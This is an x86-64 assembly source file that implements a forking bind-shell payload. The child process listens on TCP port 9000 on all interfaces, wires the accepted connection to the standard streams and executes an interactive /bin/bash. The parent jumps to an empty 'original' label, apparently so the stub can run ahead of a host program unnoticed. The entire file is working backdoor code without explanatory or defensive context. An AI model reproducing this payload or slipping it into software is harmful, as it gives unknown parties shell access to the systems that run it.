[bits 64]

%ifndef PORT
    %define PORT 0x2823 ; 9000
%endif

global _start

_start:
    mov rax, 57 ; sys_fork
    syscall

    test rax, rax
    jnz original

    mov rax, 41 ; sys_socket 
    mov rdi, 2 ; family = AF_INET
    mov rsi, 1 ; type = SOCK_STREAM
    xor rdx, rdx ; protocol = 0
    syscall ; rax = socketfd

    mov rdi, rax ; fd = socketfd
    sub rsp, 16 ; allocate 16 bytes for sockaddr_in
    mov word [rsp], 2 ; sin_family = AF_INET
    mov word [rsp+2], PORT
    mov dword [rsp+4], 0 ; sin_addr = 0 (all)
    mov rsi, rsp
    mov rdx, 16 ; addr_len = 16
    mov rax, 49 ; sys_bind
    syscall

    mov rax, 50 ; sys_listen
    mov rsi, 1 ; backlog = 1
    syscall

    mov rax, 43 ; sys_accept 
    xor rsi, rsi ; sock_addr = null
    xor rdx, rdx ; addr_len = null
    syscall ; rax = clientfd

    mov rdi, rax ; oldfd = clientfd
    xor rsi, rsi ; newfd = stdin
    mov rax, 33 ; sys_dup2 
    syscall

    inc rsi ; newfd = stdout
    mov rax, 33
    syscall

    inc rsi ; newfd = stderror
    mov rax, 33
    syscall
    
    xor rax, rax
    push rax ; argv[2] = null
    lea rax, [rel flag]
    push rax ; argv[1] = "-i"
    lea rdi, [rel path] 
    push rdi ; argv[0] = "/bin/bash"
    mov rsi, rsp
    xor rdx, rdx ; envp = null
    mov rax, 59 ; sys_execve
    syscall

    ; if execve failed exit
    mov rax, 60
    xor rdi, rdi
    syscall

path:
    db "/bin/bash", 0

flag:
    db "-i", 0

original:

